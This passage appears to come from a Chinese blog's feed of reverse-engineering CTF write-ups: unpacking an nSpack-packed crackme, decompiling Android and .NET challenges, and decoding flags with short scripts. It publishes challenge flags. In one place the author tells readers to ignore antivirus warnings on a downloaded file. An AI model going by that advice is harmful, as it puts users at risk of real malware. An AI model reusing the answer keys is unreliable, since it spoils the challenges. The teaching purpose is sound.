        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h1><p>可以看到这道题做出来的人数算多的，所以我们找这道题做，毕竟先易后难(菜，哈哈不点破)<br>下载许多遍，它一直提醒我们有病毒，好烦！<br>点进去直接出现红色警告！好家伙！<img src="https://img-blog.csdnimg.cn/2021033019574991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不要管，因为电脑上的病毒太多了，不差这个小小小小病毒！<br><img src="https://img-blog.csdnimg.cn/20210330195846691.png" alt="在这里插入图片描述"><br>还是这种套路难怪做出的人这么多！</p><p><img src="https://img-blog.csdnimg.cn/20210330200135622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有壳，不过这种壳还是第一次见，让我查查资料！<br>nSpack壳，哎说什么的都有！先看看壳吧！<br><strong><em>esp定律法</em></strong>        哎要学的还是很多的！<br>这个od要气煞我也，还有这个游览器，我先下载吾爱破解没插件，然后我又去找插件，游览器也一直下不来，然后用谷歌下载了，气煞我也，wr的乐色！想搞个Linus的系统！<br><img src="https://img-blog.csdnimg.cn/20210330212000991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我一直F8运作着，就到了一些未知区域：<br><img src="https://img-blog.csdnimg.cn/20210330212054247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里可以按Ctrl+A恢复代码！然后搜索字符串就有了！<br>不过这样子只有一次机会，要不然我们就又要开始刚刚的操作了，所以我们要将刚开始的操作去掉，就是去壳！<br>使用插件OllyDump进行脱壳！<br><img src="https://img-blog.csdnimg.cn/20210330213347803.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后在插件中找到OllyDump进行脱壳！<br><img src="https://img-blog.csdnimg.cn/20210330213551117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后再用ida打开就可以找到源代码了！<br>源代码还是很简单的，主要是让我们学习到了去壳这个技能了！嗯，不错不错！<img src="https://img-blog.csdnimg.cn/20210330213858443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上脚本！<br>原始数据很好找，这不用说了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">byte &#x3D; &#39;this_is_not_flag&#39;</span><br><span class="line">dword &#x3D; [0x12,4,8,0x14,0x24,0x5c,0x4a,0x3d,0x56,0xa,0x10,0x67,0,0x41,0,1,0x46,0x5a,0x44,0x42,0x6e,0x0c,0x44,0x72,0x0c,0x0d,0x40,0x3e,0x4b,0x5f,2,1,0x4c,0x5e,0x5b,0x17,0x6e,0xc,0x16,0x68,0x5b,0x12,0x48,0x0e]</span><br><span class="line">for i in range(42):</span><br><span class="line">    flag &#x3D; dword[i] ^ ord(byte[i % 16])</span><br><span class="line">    print(chr(flag),end&#x3D;&#39;&#39;)</span><br></pre></td></tr></table></figure><p><strong>flag{59b8ed8f-af22-11e7-bb4a-3cf862d1ee75}</strong></p><hr /><p>学习到了如何去除北斗壳，还是很可以的，主要是再od中分析到壳的范围，一直F8到真正的入口地址！</p><h1 id="android-app-100"><a href="#android-app-100" class="headerlink" title="android-app-100"></a>android-app-100</h1><p>是个安卓逆向，所以此时我首先先到的是为什么在逆向里？为什么不在mobile里面？<br>不过也别想了，先用模拟器打开看看有什么内容！<br><img src="https://img-blog.csdnimg.cn/2021033118452197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>既然如此，那么我们就用ida打开它，揭开它的真正的面目！说错了！用jadx打开它！<br><img src="https://img-blog.csdnimg.cn/20210331184937252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开a类看看里面的内容是些什么？<br><img src="https://img-blog.csdnimg.cn/20210331185355110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不过这里还有个函数IsCorrect未知，但是在MainActivity类里面是有加载一个System.loadLibrary(“adnjni”)这个lib的，所以此时我们用ida打开去看看里面的一些内容，找到这个未知函数！<br><img src="https://img-blog.csdnimg.cn/20210331190349524.png" alt="在这里插入图片描述"><br>在下面有个关键比较，看看！<br><img src="https://img-blog.csdnimg.cn/20210331190518438.png" alt="在这里插入图片描述"><br>此时我们可以将那些存储的值直接输入进去看看有什么反应！<br><img src="https://img-blog.csdnimg.cn/20210331190622762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag就拿到了，**<em>Sharif_CTF(833489ef285e6fa80690099efc5d9c9d)**</em></p><hr /><p>这道题其实是安卓逆向，主要是Java写的，不过主要是判断里面的函数，有些一眼就可以知道什么意思，不过有些还是不太知道！</p><h1 id="APK-逆向2"><a href="#APK-逆向2" class="headerlink" title="APK-逆向2"></a>APK-逆向2</h1><p>题目是APK逆向，但是下载的附件是exe可执行文件，这个确实有点不知所措！<br><img src="https://img-blog.csdnimg.cn/20210331191445141.png" alt="在这里插入图片描述"><br>这里先用EP探查一下看看里面的内容，要不然不知道该干什么了！<br><img src="https://img-blog.csdnimg.cn/2021033119241380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现是.NET写的，，此时就要用到dnSpy该软件了！<br>然后点进去函数入口地址！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Net.Sockets;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">namespace Rev_100</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Token: 0x02000002 RID: 2</span></span><br><span class="line">internal <span class="class"><span class="keyword">class</span> <span class="title">Program</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(string[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">string hostname = <span class="string">&quot;127.0.0.1&quot;</span>;<span class="comment">//链接的地址</span></span><br><span class="line"><span class="keyword">int</span> port = <span class="number">31337</span>;<span class="comment">//链接的端口</span></span><br><span class="line">TcpClient tcpClient = <span class="keyword">new</span> TcpClient();</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Connecting...&quot;</span>);</span><br><span class="line">tcpClient.Connect(hostname, port);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Cannot connect!\nFail!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="comment">//链接出错</span></span><br><span class="line">Socket client = tcpClient.Client;</span><br><span class="line">string text = <span class="string">&quot;Super Secret Key&quot;</span>;</span><br><span class="line">string text2 = Program.read();</span><br><span class="line">client.Send(Encoding.ASCII.GetBytes(<span class="string">&quot;CTF&#123;&quot;</span>));<span class="comment">//送出去CTF&#123;该段字符</span></span><br><span class="line">foreach (<span class="keyword">char</span> x in text)</span><br><span class="line">&#123;</span><br><span class="line">client.Send(Encoding.ASCII.GetBytes(Program.search(x, text2)));<span class="comment">//接着送里面的内容</span></span><br><span class="line">&#125;</span><br><span class="line">client.Send(Encoding.ASCII.GetBytes(<span class="string">&quot;&#125;&quot;</span>));<span class="comment">//最后的&#125;</span></span><br><span class="line">client.Close();</span><br><span class="line">tcpClient.Close();</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Success!&quot;</span>);<span class="comment">//提示成功</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x06000002 RID: 2 RVA: 0x0000213C File Offset: 0x0000033C</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> string <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">string fileName = Process.GetCurrentProcess().MainModule.FileName;</span><br><span class="line">string[] array = fileName.Split(<span class="keyword">new</span> <span class="keyword">char</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&#x27;\\&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line">string path = array[array.Length - <span class="number">1</span>];</span><br><span class="line">string result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">using (StreamReader streamReader = <span class="keyword">new</span> StreamReader(path))</span><br><span class="line">&#123;</span><br><span class="line">result = streamReader.ReadToEnd();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x06000003 RID: 3 RVA: 0x000021B0 File Offset: 0x000003B0</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> string <span class="title">search</span><span class="params">(<span class="keyword">char</span> x, string text)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> length = text.Length;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (x == text[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> value = i * <span class="number">1337</span> % <span class="number">256</span>;</span><br><span class="line"><span class="keyword">return</span> Convert.ToString(value, <span class="number">16</span>).PadLeft(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;??&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先想用nc直接链接一下这个地址和端口，在程序启动的一瞬间进行链接，不过很明显不行！<br>然后我又找了一些资料(看看大佬的博客)发现我上一个方法不是不可以，但是由于程序的启动时间期限过于短，所以链接不上去，而大师傅的方法是打开一个监听，一直监听该端口，这样子就能知道该程序发生了些什么？<br><img src="https://img-blog.csdnimg.cn/2021033119512259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong><em>CTF{7eb67b0bb4427e0b43b40b6042670b55}</em></strong><br>flag就出现了，这道题主要是考察我们能够监听该端口，看来得好好找找http.server库的资料了！</p><hr /><p><strong>http.server</strong> 一个类，HTTP服务器，是一个插座服务器。TCP服务器子类。它创建并监听 HTTP 插座，将请求发送给处理程序。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server包含服务器实例</span><br><span class="line">comment包含命令(请求类型)</span><br><span class="line">rfile包含位于可选输入数据开头的输入流</span><br><span class="line">wfile包含用于向客户端写回响应的输出流。在编写到此流时，必须使用适当遵守 HTTP 协议</span><br></pre></td></tr></table></figure><p>上面只是列了一些简单的函数！更多了还需再找，有一个python的英文文档，不过感觉哪上面不太全！</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1832605126&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EASYHOOK &amp; babymips &amp; key</title>
      <link href="posts/e1c49903/"/>
      <url>posts/e1c49903/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="EASYHOOK"><a href="#EASYHOOK" class="headerlink" title="EASYHOOK"></a>EASYHOOK</h1><p>附件是个exe文件，很久没有见过这种的文件了！<br><img src="https://img-blog.csdnimg.cn/20210319173530926.png" alt="在这里插入图片描述"><br>和其它的exe的逆向题一样，大胆猜测一下，应该又是一个加密算法了。先EP探查一下，没有发现什么特殊的！再用ida打开。<br>发现是个32位的文件，且是个C++写的。<br><img src="https://img-blog.csdnimg.cn/20210319174233244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们就进入加密函数中看看!<br><img src="https://img-blog.csdnimg.cn/20210319174817719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后写个脚本！<br>突然发现这是个假的flag，因为按照上面的逻辑应该是v4和a1相等，直接就是strcpy的那串字符串！<br>然后再再再找找可能存在的函数，上面的sub_401220函数里面的sub_401220函数的里面的sub_401000函数很像加密的代码，看看！<br><img src="https://img-blog.csdnimg.cn/20210319180228330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们就可以进入sub_401000这个函数里面看看呗！<br><img src="https://img-blog.csdnimg.cn/20210319180515642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时能真正的上脚本了！<br>不过还是错了，这里ida弄错了，其实上面的代码也可以进入，它那个v2=0是反汇编错误！<br><img src="https://img-blog.csdnimg.cn/20210319182503219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看这比较好解，其实里面有许多坑！</p><blockquote><p>0lag{Ho0k_w1th_Fun}</p><blockquote><p>这里也有个坑！真正的flag为flag{Ho0k_w1th_Fun}<br>所以说要小心呀！</p></blockquote></blockquote><hr /><h1 id="babymips"><a href="#babymips" class="headerlink" title="babymips"></a>babymips</h1><p>刚开始基本都一样！不过我还是要说一遍(凑个字数！)先EP再ida打开！发现是个MIPS指令！以前做过这类题！可以插件！也可以硬分析！可以有很多种方法，一种是7.5的ida直接反编译！或者jed这个软件，或者在低版本ida中装个插件！或者用ghidra这个软件！</p><blockquote><p>不过有几点要注意！jed需要的是java8的版本，而且论坛上jeb版本其实也是不同的，其中的区别也是要注意的！<br><img src="https://img-blog.csdnimg.cn/2021032016335739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><p>这里用的是Ghidra这个软件！需要配一下java环境！然后创建项目，然后将我们想要逆向的软件拖进来就可以了！<img src="https://img-blog.csdnimg.cn/20210320164407349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个软件确实有点不好用！这里有个while函数，就是把我们输入的之进行异或处理，再进入FUN_004007f0这个函数里面看看！<img src="https://img-blog.csdnimg.cn/20210320164824821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>它这里其实是移位，就是将一个数转成二进制，然后向左或向右移动几位！<br>然后上脚本！<br><img src="https://img-blog.csdnimg.cn/20210320165607952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里的脚本确实借鉴了师傅的，不过用这个软件确实不舒服！而且找的时候没有ida那么舒服，确实ida用多了！</p><hr /><h1 id="key"><a href="#key" class="headerlink" title="key"></a>key</h1><p>是个exe文件，所以先打开运行一下！发现无法运行！<br>那就用ida打开！<br><img src="https://img-blog.csdnimg.cn/20210322204503196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后在文件夹中新建该路径中的文件！这道题涉及道简单的文件操作的问题！<br><img src="https://img-blog.csdnimg.cn/20210330185250792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将上个flag.txt文件建立在相应的位置！然后我就开始用xdbg调试了，od电脑给我自动删除了，原版的od有，但吾爱版的没有了！有时候电脑的自动杀毒太烦了，但又不敢长时间去关闭！<br>事实是od调试时间有点长，所以我们还是再多分析一下函数，我们唯一的信息就是sub_4020C0该函数是很关键！<br><img src="https://img-blog.csdnimg.cn/20210330191622749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们可以猜测到flag.txt里面就是我们要找的flag，然后进入里面进行一系列的加密比较！<br><img src="https://img-blog.csdnimg.cn/20210330192555429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>栈上的值没有作用，或者说它只是存储了一些我们输入时的值，此时我们需要对Memory值进行追踪，然后我们再来看看！<br><img src="https://img-blog.csdnimg.cn/20210330192904431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们便可以看看Memory里面储存着什么值？<br><img src="https://img-blog.csdnimg.cn/20210330193044371.png" alt="在这里插入图片描述"><br>此时我们可以写个脚本！<br>不过这里提醒一下，就是这里显示的是数字，它也是字母，不信我们来看：<br><img src="https://img-blog.csdnimg.cn/20210330193550618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>同理，上另一个：<br><img src="https://img-blog.csdnimg.cn/20210330193621906.png" alt="在这里插入图片描述"><br>此时再上脚本就不会有疑问了！<br><img src="https://img-blog.csdnimg.cn/20210330194450905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后再补充一点！<br><img src="https://img-blog.csdnimg.cn/20210330194639726.png" alt="在这里插入图片描述"><br>还有就是新建个文件flag.txt，然后od调试到最后会再内存中看到flag的！</p><p>再再来补充一下，因为脚本的flag是不对的，所以我们又来了！看看我们是错在那里了，其实我们的原始数据错了，因为当时的我没看到在xmmword下面也有数据，也是属于xmmword的！<br>所以数据为themidathemidathemida\x00\x00\x00后面的\x00可以省略<br><strong><em>idg_cni~bjbfi|gsxb</em></strong></p><hr /><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1473214690&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf-mobile新手一</title>
      <link href="posts/e615a094/"/>
      <url>posts/e615a094/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="easy-so"><a href="#easy-so" class="headerlink" title="easy-so"></a>easy-so</h1><p>附件是个apk，改后缀名为zip解压。<br><img src="https://img-blog.csdnimg.cn/20210316131243554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是在模拟器中运行的情况！<br>此时将文件夹中的lib中的.so文件拖进ida中看看，Java_com_testjava_jack_pingan2_cyberpeace_CheckString.text这个函数<br>看看！<br><img src="https://img-blog.csdnimg.cn/20210316131649435.png" alt="在这里插入图片描述"><br>上面的方法可以，但是后来找到了jadx这个软件！所以直接用这个软件！接下来就是要说在jadx里面找到的有用的东西！<br><img src="https://img-blog.csdnimg.cn/20210328093905422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们可以判断一下这个判断语句是怎么去判断的！<br>其实我们可以明显看到了base64加密了，但是我们还是去看看函数！因为在ctf里面单纯的base64基本出不来了，都是一些变种base64加密！比较简单是替换base64解密表！<br><img src="https://img-blog.csdnimg.cn/20210328094335426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其实ctf打多了，base64解密脚本都有了，只是替换个表而已(复制粘贴)然后运行我们就有了解密脚本了！<br><img src="https://img-blog.csdnimg.cn/20210328094538109.png" alt="在这里插入图片描述"><br>然后我们进行解密就可以了！<br><strong>flag{90705bb55efb59da7fc2a5636549812a}</strong></p><p>其实这里我弄错了！flag是对的，不过是后来改的，其实在ida中可以分析到它将输入的字符串给拆成两个，然后交换位置！此时再进行base64解密就可以了！</p><hr /><h1 id="app1"><a href="#app1" class="headerlink" title="app1"></a>app1</h1><p>先改后缀名为zip，然后解压文件，发现这种方法在这儿是行不通的！所以我便开始找资料，从网上寻找各种资料，有apkIDE，和AndironKiller还有一个jadx，但网上的大都使用的是jadx这个开源的软件，所以我就开始找！(其实其它的软件进行反编译会出错！可能是我那个地方弄错了吧)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jadx软件使用方法！</span><br><span class="line">1.将apk文件拷贝到bin目录。</span><br><span class="line">2.jadx-gui test.apk 调用gui。</span><br><span class="line">3.jadx -d out test.apk 输出源码。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>到这里有点坑！我下载好了！但是解压出错！github又打不开了，哎！到后来又解压了一遍！</p><blockquote><p>不诉苦了，开始解它<br><img src="https://img-blog.csdnimg.cn/20210326214910978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们要找到那两个数据，不过上图的原始数据搞错了(是通过该包来找到原始数据的)，再来！<br><img src="https://img-blog.csdnimg.cn/20210327095343384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们其实就可以写个简单的脚本，主要是我们接触安卓的比较少！所以不知道要用那些软甲！<br><img 